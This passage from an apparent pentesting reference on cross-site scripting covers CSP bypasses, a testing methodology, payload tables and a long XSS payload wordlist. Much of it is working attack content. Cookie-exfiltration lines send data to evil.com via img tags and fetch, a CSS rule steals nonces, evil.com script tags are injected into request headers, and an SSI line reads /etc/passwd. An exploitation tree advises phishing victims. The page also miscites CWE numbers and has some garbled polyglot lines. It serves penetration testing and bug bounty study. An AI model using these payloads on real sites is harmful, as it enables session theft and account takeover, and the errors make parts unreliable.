Content Security Policy (CSP) is the primary defense against XSS. Understanding CSP bypasses is critical for both attackers and defenders.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Common CSP Bypasses"}
  ```javascript [csp-bypasses.js]
  // ═══════════════════════════════════════
  // CSP BYPASS TECHNIQUES
  // ═══════════════════════════════════════

  // 1. CSP with 'unsafe-inline' (trivially bypassable)
  // CSP: script-src 'self' 'unsafe-inline'
  <script>alert(1)</script>  // Just works

  // 2. CSP with 'unsafe-eval' 
  // CSP: script-src 'self' 'unsafe-eval'
  <img src=x onerror="eval('alert(1)')">

  // 3. CSP allows specific CDN
  // CSP: script-src 'self' cdnjs.cloudflare.com
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
  <div ng-app ng-csp>
    {{$eval.constructor('alert(1)')()}}
  </div>

  // 4. CSP allows *.google.com or googleapis
  // CSP: script-src 'self' *.googleapis.com
  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">
  </script>

  // 5. CSP allows data: URIs
  // CSP: script-src 'self' data:
  <script src="data:text/javascript,alert(1)"></script>

  // 6. CSP with base-uri missing
  // CSP: script-src 'nonce-abc123'  (no base-uri directive)
  <base href="https://evil.com/">
  <!-- Now relative script paths load from evil.com -->

  // 7. CSP with JSONP endpoint on allowed domain
  // CSP: script-src 'self' allowed-domain.com
  <script src="https://allowed-domain.com/api/jsonp?callback=alert(1)//">
  </script>

  // 8. CSP bypass via DOM clobbering + script gadget
  <form id=defaultConfig>
    <output name=url>https://evil.com/xss.js</output>
  </form>
  <!-- If app JS does: loadScript(defaultConfig.url) -->

  // 9. Exfiltration without script-src violation
  // CSP: script-src 'self'; img-src *
  // Use allowed img-src for exfiltration:
  <img src="https://evil.com/steal?c="+document.cookie>

  // CSP: script-src 'self'; connect-src *
  // Use fetch/XHR for exfiltration:
  fetch('https://evil.com/steal?c='+document.cookie)

  // 10. CSP bypass via meta refresh
  // CSP: script-src 'none'  (but no navigation restrictions)
  <meta http-equiv="refresh" content="0;url=https://evil.com/steal?c=
  // Cookie appended by browser in Referer header
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="CSP Nonce Bypass"}
  ```html [csp-nonce-bypass.html]
  <!-- CSP: script-src 'nonce-abc123' -->

  <!-- If nonce is predictable or reused -->
  <script nonce="abc123">alert(1)</script>

  <!-- If page has DOM XSS sink that copies nonce -->
  <!-- Some frameworks copy nonce to dynamically added scripts -->

  <!-- Script gadgets: existing scripts that process attacker data -->
  <!-- If a nonced script does something like: -->
  <!-- document.write(location.hash.slice(1)) -->
  <!-- Payload: #<img src=x onerror=alert(1)> -->

  <!-- Nonce exfiltration via CSS injection -->
  <!-- If style-src allows inline: -->
  <style>
  script[nonce^="a"] { background: url(https://evil.com/nonce?c=a) }
  script[nonce^="ab"] { background: url(https://evil.com/nonce?c=ab) }
  script[nonce^="abc"] { background: url(https://evil.com/nonce?c=abc) }
  /* Character-by-character nonce extraction */
  </style>

  <!-- Dangling markup to capture nonce -->
  <img src="https://evil.com/steal?html=
  <!-- Browser sends everything up to next quote as URL -->
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="CSP Analysis"}
  ```text [csp-analysis-guide.txt]
  CSP ANALYSIS METHODOLOGY:
  ═════════════════════════
  
  Step 1: Get the CSP header
  ─────────────────────────
  curl -sI https://target.com | grep -i "content-security-policy"
  
  Step 2: Analyze with online tools
  ─────────────────────────────────
  https://csp-evaluator.withgoogle.com/
  https://csper.io/evaluator
  
  Step 3: Check for common misconfigurations
  ──────────────────────────────────────────
  ☐ 'unsafe-inline' in script-src → Inline XSS works
  ☐ 'unsafe-eval' in script-src → eval() works
  ☐ data: in script-src → data: URI scripts work
  ☐ Wildcard (*) in script-src → Any domain
  ☐ http: in script-src → HTTP downgrade possible
  ☐ Missing base-uri → base tag injection
  ☐ Missing object-src → plugin-based XSS
  ☐ Missing frame-ancestors → Clickjacking
  ☐ Allowed CDNs with JSONP → Callback injection
  ☐ Allowed CDNs with Angular → Template injection
  ☐ Too broad domain (*.google.com) → Abuse subdomains
  ☐ report-uri only (no enforce) → CSP not blocking
  ☐ Nonce reuse across requests → Predictable nonce
  ☐ Missing script-src-elem → script element bypass
  ```
  :::
::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Map Input Vectors

```text [xss-recon-checklist.txt]
XSS RECONNAISSANCE CHECKLIST:
═════════════════════════════

Input Discovery:
☐ URL parameters (?search=, ?q=, ?name=, ?redirect=)
☐ POST body parameters (forms, JSON, XML)
☐ HTTP headers (User-Agent, Referer, X-Forwarded-For)
☐ Cookie values
☐ File upload filenames
☐ URL path segments (/profile/USERNAME)
☐ Fragment identifiers (#hash)
☐ WebSocket messages
☐ postMessage data
☐ localStorage/sessionStorage values read by JS

Reflection Analysis:
☐ Where does input appear in the response?
☐ What context? (HTML body, attribute, JS, URL)
☐ What encoding is applied?
☐ What characters are filtered/escaped?
☐ Is it reflected immediately or stored?
☐ Is it in the HTTP response or only DOM?

Technology Stack:
☐ Frontend framework (React, Angular, Vue)?
☐ Server-side template engine?
☐ WAF present? Which one?
☐ CSP header present? What policy?
☐ X-XSS-Protection header?
☐ HttpOnly on session cookies?
```

#### Discovery — Test for XSS

```bash [xss-discovery.sh]
#!/bin/bash
# Automated XSS Discovery

TARGET="https://target.com"

# 1. Parameter discovery with Arjun
arjun -u "$TARGET/search" -m GET POST

# 2. Reflected XSS scanning with Dalfox
dalfox url "$TARGET/search?q=test" \
  --waf-evasion \
  --blind https://your-xsshunter.com \
  --output dalfox_results.txt

# 3. Crawl and scan with XSStrike
python3 xsstrike.py -u "$TARGET/search?q=test" --crawl -l 3

# 4. DOM XSS scanning with dom-red
# Check for dangerous sinks in JavaScript files
cat js_files.txt | while read url; do
  curl -s "$url" | grep -E "(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|\.html\(|\.append\()" 
done

# 5. Mass parameter fuzzing
cat params.txt | while read param; do
  RESPONSE=$(curl -s "$TARGET/page?$param=xss7e8f2a" | grep -c "xss7e8f2a")
  if [ "$RESPONSE" -gt 0 ]; then
    echo "[+] Reflected: $param"
  fi
done

# 6. Blind XSS injection into headers
curl -s "$TARGET/" \
  -H "User-Agent: <script src=//evil.com/blind.js></script>" \
  -H "Referer: <script src=//evil.com/blind.js></script>" \
  -H "X-Forwarded-For: <script src=//evil.com/blind.js></script>"
```

#### Exploitation — Deliver the Payload

```text [xss-exploitation-guide.txt]
EXPLOITATION DECISION TREE:
═══════════════════════════

Q: What TYPE of XSS?
├── Reflected → Craft URL, send to victim via phishing
├── Stored → Submit payload, wait for victims to view
├── DOM → Craft URL with fragment/param, send to victim
└── Blind → Inject everywhere, wait for callback

Q: What is the CONTEXT?
├── HTML body → Use <script>, <img>, <svg> tags
├── Attribute → Break out with ", add event handler
├── JavaScript → Close string with ', inject code
├── URL/href → Use javascript: protocol
└── CSS → Limited; use expression() or escape to HTML

Q: What is FILTERED?
├── <script> → Use <img>, <svg>, <details>, etc.
├── alert → Use confirm, prompt, fetch, etc.
├── Parentheses → Use backticks, throw, etc.
├── Quotes → Use encoding, backticks, no-quote attrs
├── Angle brackets → If in JS context, don't need them
└── Everything → Try encoding, mutation, DOM clobbering

Q: Is there CSP?
├── No CSP → Standard XSS works
├── unsafe-inline → Inline XSS works
├── Nonce-based → Find nonce leak or script gadget
├── Strict → Look for JSONP, Angular, or CDN bypass
└── Very strict → DOM clobbering, dangling markup, meta redirect

Q: What is the GOAL?
├── PoC → alert(document.domain)
├── Cookie theft → document.cookie exfiltration
├── Account takeover → Change email/password via CSRF
├── Data exfiltration → Scrape sensitive API endpoints
├── Persistence → Service Worker, DOM storage poisoning
└── Lateral movement → Attack internal services via victim browser
```

#### Reporting — Document the Finding

```text [xss-report-template.txt]
VULNERABILITY: [Reflected/Stored/DOM] Cross-Site Scripting
SEVERITY: [Medium/High/Critical]
AFFECTED URL: https://target.com/vulnerable-endpoint
PARAMETER: [parameter name]
CVSS: [6.1 - 9.6 depending on type and impact]

DESCRIPTION:
The [parameter] parameter on [endpoint] is vulnerable to
[Reflected/Stored/DOM-based] Cross-Site Scripting. User-supplied
input is [reflected in the response / stored in the database /
processed by client-side JavaScript] without proper [encoding /
sanitization / escaping], allowing an attacker to inject arbitrary
JavaScript that executes in victims' browsers.

REPRODUCTION STEPS:
1. Navigate to: [URL with payload]
2. Observe: [alert box / behavior]
3. View source: [where payload appears]

PROOF OF CONCEPT:
Payload: [exact payload used]
URL: [full URL if reflected]

IMPACT:
- Session hijacking via cookie theft
- Account takeover via CSRF token extraction
- Credential harvesting via fake login form injection
- Sensitive data exfiltration
- Malware distribution to application users
- [Worm propagation if stored XSS]

EVIDENCE:
[Screenshots, HTTP request/response, video]
```

::

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Quick Context-Based Payload Selection
  ---
  | Context | First Payload to Try | If Filtered |
  |---------|---------------------|-------------|
  | **HTML body** | `<img src=x onerror=alert(1)>` | `<svg onload=alert(1)>` |
  | **Double-quoted attr** | `" onfocus=alert(1) autofocus="` | `"><svg onload=alert(1)>` |
  | **Single-quoted attr** | `' onfocus=alert(1) autofocus='` | `'><svg onload=alert(1)>` |
  | **Unquoted attr** | `x onfocus=alert(1) autofocus` | `x><svg onload=alert(1)>` |
  | **href/src attr** | `javascript:alert(1)` | `data:text/html,<script>alert(1)</script>` |
  | **JS single-quote string** | `';alert(1);//` | `</script><script>alert(1)</script>` |
  | **JS double-quote string** | `";alert(1);//` | `</script><script>alert(1)</script>` |
  | **JS template literal** | `${alert(1)}` | `${self['alert'](1)}` |
  | **HTML comment** | `--><script>alert(1)</script><!--` | `--><img src=x onerror=alert(1)>` |
  | **Inside `<title>`** | `</title><script>alert(1)</script>` | `</title><img src=x onerror=alert(1)>` |
  | **Inside `<style>`** | `</style><script>alert(1)</script>` | `</style><img src=x onerror=alert(1)>` |
  | **Inside `<textarea>`** | `</textarea><script>alert(1)</script>` | `</textarea><img src=x onerror=alert(1)>` |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Polyglot Payloads (Work Across Multiple Contexts)
  ---
  ```html [polyglot-payloads.html]
  <!-- Universal Polyglots — test multiple contexts at once -->

  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
  %0telerik/%0d%0a</telerik><img src=x onerror=alert(1)>

  -->'"/></sCript><dEtworlds class=popup onclick=alert(1)>
  <!--#exec cmd="/bin/cat /etc/passwd"-->
  <img src=x onerror=alert(1)>

  javascript:alert(1)//
  ';alert(1)//
  "-alert(1)-"
  "><svg onload=alert(1)>

  ';alert(String.fromCharCode(88,83,83))//';
  alert(String.fromCharCode(88,83,83))//";
  alert(String.fromCharCode(88,83,83))//--
  ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

  <!-- Comprehensive polyglot -->
  '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\>
  <plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com
  <isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
  <script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"
  onerror=eval(id)>'"><img src="https://evil.com/x">
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Framework-Specific XSS Vectors
  ---
  | Framework | XSS Vector | Example |
  |-----------|-----------|---------|
  | **Angular (1.x)** | Template injection | `{{constructor.constructor('alert(1)')()}}` |
  | **Angular (2+)** | DOM binding bypass | `[innerHTML]` with unsanitized data |
  | **React** | `dangerouslySetInnerHTML` | `dangerouslySetInnerHTML={{__html: userInput}}` |
  | **React** | `href` with `javascript:` | `<a href={userInput}>` where input = `javascript:alert(1)` |
  | **Vue.js** | `v-html` directive | `<div v-html="userInput">` |
  | **Vue.js** | Template injection | Server-side rendered `{{ userInput }}` |
  | **jQuery** | `.html()` sink | `$(selector).html(userInput)` |
  | **jQuery** | Selector injection | `$(userInput)` |
  | **Ember** | `{{{triple-stash}}}` | `{{{userInput}}}` (unescaped) |
  | **EJS** | Unescaped output | `<%- userInput %>` |
  | **Pug/Jade** | Unescaped output | `!{userInput}` |
  | **Handlebars** | Triple stash | `{{{userInput}}}` |
  | **Twig** | `raw` filter | `{{ userInput\|raw }}` |
  | **Jinja2** | SSTI → XSS | `{{config.__class__.__init__.__globals__}}` |
  | **Thymeleaf** | `th:utext` | `th:utext="${userInput}"` (unescaped) |
  | **WordPress** | Shortcode injection | `[shortcode onload=alert(1)]` |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: XSS Without Angle Brackets
  ---
  ```text [no-angle-brackets.txt]
  WHEN < > ARE COMPLETELY FILTERED:
  ═════════════════════════════════
  
  You need to already be inside a JavaScript or attribute context.
  
  INSIDE JAVASCRIPT STRING:
  ';alert(1);//
  ";alert(1);//
  ${alert(1)}               (template literal)
  \x3cscript\x3ealert(1)\x3c/script\x3e  (hex escape → reconstructs tags)
  
  INSIDE EVENT HANDLER:
  ');alert(1);//            (break out of function call)
  alert(1)                  (if directly in handler)
  
  INSIDE HREF/SRC:
  javascript:alert(1)
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  
  INSIDE CSS:
  expression(alert(1))     (IE only)
  url(javascript:alert(1)) (very old browsers)
  
  DOM CLOBBERING (no tags, just attribute values):
  Won't work without some tag injection
  
  IF YOU CAN INJECT INTO EXISTING ONCLICK/ONFOCUS/ETC:
  Payload depends on current handler code
  Example: If onclick="loadPage('USER_INPUT')"
  Inject: ');alert(1);//
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Bug Bounty Tips for XSS
  ---
  ```text [bug-bounty-xss-tips.txt]
  BUG BOUNTY XSS TIPS:
  ════════════════════
  
  HIGH-VALUE TARGETS:
  ├── Login page XSS → credential theft (Critical)
  ├── Password reset page → token theft (Critical)
  ├── OAuth callback → access_token theft (Critical)
  ├── Admin-facing pages → blind XSS in admin panel (High)
  ├── Payment pages → credit card theft (Critical)
  ├── File upload → stored XSS via filename/metadata (High)
  └── API error pages → reflected XSS in error messages (Medium)
  
  SHOW MAXIMUM IMPACT:
  ├── Don't just show alert(1) — show alert(document.domain)
  ├── Demonstrate cookie theft if HttpOnly is not set
  ├── Show account takeover chain if possible
  ├── Demonstrate CSP bypass if CSP exists
  ├── Show worm potential for stored XSS
  └── Calculate blast radius (how many users affected)
  
  AVOID DUPLICATE REPORTS:
  ├── Test unique endpoints, not just parameter variations
  ├── Different XSS types count as different vulns
  ├── DOM XSS vs Reflected on same page = separate issues
  ├── Different root causes = separate reports
  └── Same parameter, different encoding bypass = likely duplicate
  
  COMMON MISTAKES:
  ✗ Testing only GET parameters (test POST, headers, JSON)
  ✗ Only testing obvious fields (search, name)
  ✗ Not checking for DOM XSS (use browser DevTools)
  ✗ Stopping at the first find (there are usually more)
  ✗ Not testing authenticated areas
  ✗ Not testing mobile versions of the site
  ```
  :::
::

---

## Automation & Tools

::card-group
  ::card
  ---
  title: Dalfox
  icon: i-simple-icons-go
  to: https://github.com/hahwul/dalfox
  target: _blank
  ---
  Fast parameter analysis and XSS scanning tool written in Go. Supports pipeline integration, WAF evasion, blind XSS, and custom payload injection.
  ::

  ::card
  ---
  title: XSStrike
  icon: i-simple-icons-python
  to: https://github.com/s0md3v/XSStrike
  target: _blank
  ---
  Advanced XSS detection suite with intelligent payload generation, context analysis, fuzzing engine, and WAF detection/evasion capabilities.
  ::

  ::card
  ---
  title: XSS Hunter Express
  icon: i-simple-icons-github
  to: https://github.com/mandatoryprogrammer/xsshunter-express
  target: _blank
  ---
  Self-hosted blind XSS detection platform. Captures screenshots, DOM snapshots, cookies, and page source when blind payloads fire.
  ::

  ::card
  ---
  title: Burp Suite Scanner
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/vulnerability-scanner
  target: _blank
  ---
  Industry-standard web vulnerability scanner with advanced XSS detection including DOM-based XSS, stored XSS, and complex injection contexts.
  ::

  ::card
  ---
  title: DOM Invader (Burp Extension)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
  target: _blank
  ---
  Browser-based DOM XSS testing tool built into Burp's embedded browser. Automatically finds sources and sinks for DOM-based vulnerabilities.
  ::

  ::card
  ---
  title: kxss
  icon: i-simple-icons-go
  to: https://github.com/Emoe/kxss
  target: _blank
  ---
  Fast tool to check which characters are reflected in URL parameters. Essential for quick XSS feasibility testing across many endpoints.
  ::

  ::card
  ---
  title: gxss
  icon: i-simple-icons-go
  to: https://github.com/KathanP19/Gxss
  target: _blank
  ---
  Tool to check reflected parameters across multiple URLs. Works with pipeline tools for mass scanning. Checks for special character reflection.
  ::

  ::card
  ---
  title: Nuclei XSS Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates
  target: _blank
  ---
  ProjectDiscovery's template collection includes hundreds of XSS detection templates for specific CVEs, technologies, and common patterns.
  ::
::

### XSS Payload Wordlists

::code-collapse

```text [xss-payload-wordlist.txt]
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" autofocus onfocus=alert(1) "
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
${alert(1)}
{{constructor.constructor('alert(1)')()}}
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<svg><script>alert(1)</script></svg>
<math><mi xlink:href="javascript:alert(1)">click
<form><button formaction=javascript:alert(1)>X</button>
<isindex action=javascript:alert(1) type=submit>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=[1].find(alert)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>
<img src=x onerror=top['al\x65rt'](1)>
<svg><animate onbegin=alert(1) attributeName=x>
<img src=x onerror="throw onerror=alert,1">
<xss id=x tabindex=1 onfocus=alert(1)></xss>
%3Cscript%3Ealert(1)%3C/script%3E
%22%20onfocus%3Dalert(1)%20autofocus%3D%22
&#60;script&#62;alert(1)&#60;/script&#62;
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "Samy Worm — MySpace (2005)"
  icon: i-lucide-bug
  to: https://samy.pl/myspace/
  target: _blank
  ---
  The fastest spreading virus of all time. Samy Kamkar's stored XSS worm added over 1 million friends in under 24 hours by exploiting MySpace's CSS filter bypass.
  ::

  ::card
  ---
  title: "Google Search XSS ($7,500 Bounty)"
  icon: i-simple-icons-google
  to: https://www.acunetix.com/blog/web-security-zone/google-xss-vulnerability/
  target: _blank
  ---
  Reflected XSS found in Google Search through parameter manipulation. Demonstrates that even the most security-conscious companies have XSS vulnerabilities.
  ::

  ::card
  ---
  title: "Apache Velocity DOM XSS"
  icon: i-simple-icons-apache
  to: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13936
  target: _blank
  ---
  DOM-based XSS in Apache Velocity engine through template injection, affecting numerous Java-based web applications.
  ::

  ::card
  ---
  title: "WordPress Stored XSS (CVE-2021-29447)"
  icon: i-simple-icons-wordpress
  to: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/
  target: _blank
  ---
  Stored XSS via media file upload in WordPress core affecting millions of installations. Payload embedded in file metadata.
  ::

  ::card
  ---
  title: "Uber DOM XSS ($3,000 Bounty)"
  icon: i-simple-icons-uber
  to: https://hackerone.com/reports/dom-xss
  target: _blank
  ---
  DOM-based XSS on Uber's authentication flow through postMessage handler that didn't validate message origin, allowing cross-origin script injection.
  ::

  ::card
  ---
  title: "Twitter XSS Worm (2014)"
  icon: i-simple-icons-x
  to: https://blog.twitter.com/engineering
  target: _blank
  ---
  Stored XSS worm on TweetDeck that auto-retweeted itself. Exploited innerHTML usage on tweet content, spreading to over 40,000 accounts.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "PortSwigger — XSS Labs"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/cross-site-scripting
  target: _blank
  ---
  30+ free interactive labs covering reflected, stored, DOM XSS, CSP bypass, and dangling markup. The definitive hands-on XSS learning resource.
  ::

  ::card
  ---
  title: "OWASP XSS Prevention Cheat Sheet"
  icon: i-simple-icons-owasp
  to: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  target: _blank
  ---
  Comprehensive OWASP guide covering output encoding rules for every HTML context. Essential reference for understanding WHY payloads work.
  ::

  ::card
  ---
  title: "PortSwigger — XSS Cheat Sheet"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  target: _blank
  ---
  Interactive XSS payload database filterable by tag, event, browser version. The most comprehensive XSS payload reference available.
  ::

  ::card
  ---
  title: "HackTricks — XSS"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
  target: _blank
  ---
  Community-maintained reference with WAF bypasses, filter evasion, framework-specific vectors, and real-world exploitation techniques.
  ::

  ::card
  ---
  title: "Google Bughunter University — XSS"
  icon: i-simple-icons-google
  to: https://bughunters.google.com/learn/invalid-reports/web-platform/xss
  target: _blank
  ---
  Google's guidance on XSS reports — learn what makes a high-quality XSS submission and common mistakes that lead to report rejection.
  ::

  ::card
  ---
  title: "CWE-79 — Cross-site Scripting"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/79.html
  target: _blank
  ---
  MITRE CWE entry for XSS including all subtypes (Reflected CWE-79, Stored CWE-80, DOM CWE-843), attack patterns, and taxonomy.
  ::

  ::card
  ---
  title: "Payload All The Things — XSS"
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  target: _blank
  ---
  Massive collection of XSS payloads organized by context, filter bypass, framework, and encoding. Essential reference for payload crafting.
  ::

  ::card
  ---
  title: "XSS Payloads — Curated List"
  icon: i-simple-icons-github
  to: https://github.com/payloadbox/xss-payload-list
  target: _blank
  ---
  Large curated collection of XSS payloads for various contexts, WAFs, and filter bypass scenarios. Over 4,000+ unique payloads.
  ::

  ::card
  ---
  title: "Mutation XSS (mXSS) Research"
  icon: i-lucide-file-text
  to: https://cure53.de/fp170.pdf
  target: _blank
  ---
  Cure53's research paper on Mutation XSS — payloads that bypass sanitizers by exploiting browser HTML parsing mutations. Advanced technique.
  ::

  ::card
  ---
  title: "CSP Evaluator (Google)"
  icon: i-simple-icons-google
  to: https://csp-evaluator.withgoogle.com/
  target: _blank
  ---
  Google's CSP analysis tool. Paste a CSP header and get instant analysis of weaknesses, bypass possibilities, and best practice violations.
  ::

  ::card
  ---
  title: "HTML5 Security Cheatsheet"
  icon: i-lucide-shield
  to: https://html5sec.org/
  target: _blank
  ---
  Comprehensive database of HTML5 attack vectors including XSS, UI redressing, and browser-specific quirks. Filterable by browser and category.
  ::

  ::card
  ---
  title: "XSS Game (Google)"
  icon: i-simple-icons-google
  to: https://xss-game.appspot.com/
  target: _blank
  ---
  Google's interactive XSS challenge game with progressive difficulty. Great for beginners to practice identifying and exploiting XSS vulnerabilities.
  ::
::